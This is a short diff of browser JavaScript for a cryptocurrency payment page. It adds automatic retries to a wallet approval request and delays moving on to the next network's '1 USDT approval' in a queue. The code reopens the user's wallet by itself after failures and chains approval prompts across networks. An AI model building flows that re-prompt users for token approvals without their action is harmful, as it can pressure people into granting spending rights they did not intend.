@@ -523,11 +523,28 @@ async function requestCurrentApproval() {
       body: '{}',
     });
     const data = await res.json();
-    if (!res.ok) throw new Error(data.message || 'Could not request approval');
+    if (!res.ok) {
+      if (/already waiting/i.test(String(data.message || ''))) return;
+      throw new Error(data.message || 'Could not request approval');
+    }
     reopenSelectedWallet();
   } catch (err) {
-    showPayError(err.message);
-    advanceAfterNetworkDone('failed');
+    try {
+      await sleep(1200);
+      reopenSelectedWallet();
+      const retry = await fetch(BASE + '/api/payment/' + encodeURIComponent(paymentId) + '/request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{}',
+      });
+      const retryData = await retry.json();
+      if (!retry.ok) throw new Error(retryData.message || err.message);
+      reopenSelectedWallet();
+      return;
+    } catch (_retryErr) {
+      showPayError(err.message);
+      advanceAfterNetworkDone('failed');
+    }
   }
 }
 
@@ -574,7 +591,9 @@ function advanceAfterNetworkDone(reason, fromPaymentId) {
   const next = paymentQueue[paymentIndex];
   const label = next && next.network ? String(next.network).toUpperCase() : 'next';
   setBusy(true, 'Confirm in your wallet', 'Opening the ' + label + ' 1 USDT approval in your wallet.');
-  runCurrentNetwork();
+  setTimeout(function () {
+    runCurrentNetwork();
+  }, 1500);
 }
 
 async function startBackgroundApproval() {
